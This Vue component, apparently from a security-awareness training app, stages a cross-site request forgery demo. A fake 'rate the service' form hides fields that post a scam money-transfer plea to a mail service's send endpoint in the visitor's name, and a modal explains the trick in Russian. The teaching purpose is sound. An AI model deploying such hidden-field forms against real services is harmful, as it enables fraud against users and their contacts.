<template>
  <div class="mail__container">
    <form action="http://элпочта.рф/send" method="POST" class="mail__content">
      <span style="font-size: 1.4vw; align-self: center">Оцените сервис элпочта.рф</span>
      <span style="font-size: 0.9vw; font-weight: 400; margin-top: 2vh">Оцените по 10-балльной шкале</span>
      <input class="mail__input" type="number"/>
      <input class="mail__input" type="hidden" name="name" value="ivan.i@элпочта.рф"/>
      <input class="mail__input" type="hidden" name="theme" value="Помоги!"/>
      <input class="mail__input" type="hidden" name="text" value="Привет. Деньги закончились. Переведи пж деньги на карту 123456789123"/>
      <button class="mail__btn" type="submit" @click="$router.push(`/elMailRfResult`)">ОТПРАВИТЬ</button>
    </form>
    <anonymous-modal text-message="<p>На сайте хакера расположена форма. На первый взгляд ничего необычного.</p>
                                   <p>Кнопка отправляет запрос на элпочта.рф. Но между кнопкой и полем оценки в HTML-форме вставлено скрытое поле с уже заполненным сообщением хакера: “Привет. Деньги закончились. Переведи пж деньги на карту 123456789123”.</p>
                                   <p>Таким образом, при нажатии на кнопку, от Вашего имени отправляется сообщение Вашим друзьям.</p>">
    </anonymous-modal>
  </div>
</template>

<script>
import AnonymousModal from "@/components/UI/AnonymousModal.vue";

export default {
  components: {AnonymousModal},
  data() {
    return {

    }
  }
}
</script>

<style scoped>
.mail__container {
  display: flex;
  justify-content: center;
  align-items: center;
  z-index: 0;
  width: 100vw;
  height: 100vh;
  background-color: rgba(237, 237, 239, 1);
}

.mail__content {
  display: flex;
  justify-content: center;
  justify-items: center;
  flex-direction: column;
  background-color: rgba(217, 217, 217, 1);
  border-radius: 2vw;
  max-height: fit-content;
  padding: 2vw;
}

.mail__input {
  width: 40vw;
  height: 5vh;
  padding-left: 1vw;
  border: none;
  margin-top: 1vh;
  border-radius: 0.7vw;
}

.mail__input:focus {
  outline: 0.1vw solid rgba(40, 77, 210, 1);
}

.mail__btn {
  font-size: 1.2vw;
  font-weight: 500;
  margin-top: 2vh;
  border: none;
  background-color: rgba(40, 77, 210, 1);
  color: white;
  width: 40vw;
  height: 5vh;
  cursor: pointer;
  border-radius: 0.7vw;
}
</style>
